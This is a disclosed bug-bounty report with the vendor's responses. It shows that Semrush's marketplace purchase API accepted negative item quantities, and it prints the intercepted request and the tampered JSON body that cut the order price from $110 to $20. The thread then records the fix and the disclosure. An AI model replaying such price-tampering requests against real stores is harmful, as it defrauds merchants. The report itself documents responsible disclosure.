title: An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss
vulnerability_information:
Hi there,

When we
**Summary:** 
When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attacker can pay for less than intended due to  negative quantities being allowed. 

## Steps To Reproduce:
- Go to https://www.semrush.com/marketplace/offers/
- Click on 500 Words($40) Order Now button.
- Select any two articles.
- Intercept the request:

```
POST /marketplace/api/purchases/bulk HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.semrush.com/marketplace/offers/
Content-type: application/json
Origin: https://www.semrush.com
Content-Length: 45
DNT: 1
Connection: close
Cookie: COOKIES

{"items":{"article_500":1,"article_1000":1}}
```

- The actual price should be $110 for two articles.

Change the JSON body to :

```
{"items":{"article_500":4,"article_1000":-2}}
```

- The cost will become $20 for two articles:
4 * $40- 2 * $70= $160 - $140 = $20

â–ˆâ–ˆâ–ˆâ–ˆ

I even tried with my Virtual Card. Here is the failed payment. This is the proof that it actually charges the lowered amount:
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ

Regards,
Yash

## Impact

An attacker can buy articles at much lower rates by exploiting this vulnerability which could cause severe business losses to Semrush
vulnerability_information_html:
Hi there,

When we
Summary:
When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attacker can pay for less than intended due to negative quantities being allowed.

Steps To Reproduce:

  • Go to https://www.semrush.com/marketplace/offers/
  • Click on 500 Words($40) Order Now button.
  • Select any two articles.
  • Intercept the request:
POST /marketplace/api/purchases/bulk HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.semrush.com/marketplace/offers/
Content-type: application/json
Origin: https://www.semrush.com
Content-Length: 45
DNT: 1
Connection: close
Cookie: COOKIES

{"items":{"article_500":1,"article_1000":1}}
  • The actual price should be $110 for two articles.

Change the JSON body to :

{"items":{"article_500":4,"article_1000":-2}}
  • The cost will become $20 for two articles: 4 * $40- 2 * $70= $160 - $140 = $20

â–ˆâ–ˆâ–ˆâ–ˆ

I even tried with my Virtual Card. Here is the failed payment. This is the proof that it actually charges the lowered amount:
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ

Regards,
Yash

Impact

An attacker can buy articles at much lower rates by exploiting this vulnerability which could cause severe business losses to Semrush

activities.message: Hi! Thanks for the report, we will investigate this.
activities.markdown_message: Hi! Thanks for the report, we will investigate this.

activities.message: Woah that's a very quick response, @wshuwll. Thanks for looking into it
activities.markdown_message: Woah that's a very quick response, @wshuwll. Thanks for looking into it

activities.message: Bug's pushed to appropriate team. We are waiting for team's response.
activities.markdown_message: Bug's pushed to appropriate team. We are waiting for team's response.

activities.message:
Team confirmed and fixed the bug. But we need more time to gather information to set right severity. We will made it (**severity may change!**) no later than Tuesday. Meanwhile, could you check the fix please?
Thanks for the cool report!
activities.markdown_message:
Team confirmed and fixed the bug. But we need more time to gather information to set right severity. We will made it (severity may change!) no later than Tuesday. Meanwhile, could you check the fix please?
Thanks for the cool report!

activities.message: Thanks for making our service safer! :)
@wshuwll Nice quick fix! The endpoint returns `bad amount` now.
activities.markdown_message: @wshuwll Nice quick fix! The endpoint returns bad amount now.

activities.message:
> But we need more time to gather information to set right severity. 

I made a sample calculator for showing the impact:â–ˆâ–ˆâ–ˆâ–ˆ. This is an example:
â–ˆâ–ˆâ–ˆâ–ˆ

An attacker could do 193 articles at $10(better example than the one given in my report). The original price should be around $10k.. that's like 1000 times less value and hence business loss. Not critical as this could have been detected in the backend by some staff if someone did order such a big number of articles, but not medium as this could have led to quite losses if exploited.

In any case, the turnaround time for this bug was amazing.

Regards,
Yash

activities.message: Also @wshuwll, is there anyway I could get a promo-code/voucher for testing the paid features of SEMrush? I would be very glad to test that functionality of the website. The free plan is very limited in terms of features.

You have one week to activate it and it will last for 2 weeks. Here you can see a brief description of Business plan's features - https://www.semrush.com/prices/#table.

Cheers!

activities.message: Hi @wshuwll, just wanted to tell you if you don't take any action, this would be disclosed as full in a few days automatically. I have added basic summary on the top of the report. If you're fine with that, we can do a limited disclosure as you said :) Purpose of disclose is just sharing info with the community so they can learn from this as well

activities.message: Hi, @yashrs ! Sorry for delay, I missed your last message. We've made a decision disclose report fully tomorrow! :)

summaries.content: The SEMrush team triaged and patched this issue in less than 24 hours. That's a great turnaround time! It was nice working with the team :)
summaries.content_html: The SEMrush team triaged and patched this issue in less than 24 hours. That's a great turnaround time! It was nice working with the team :)
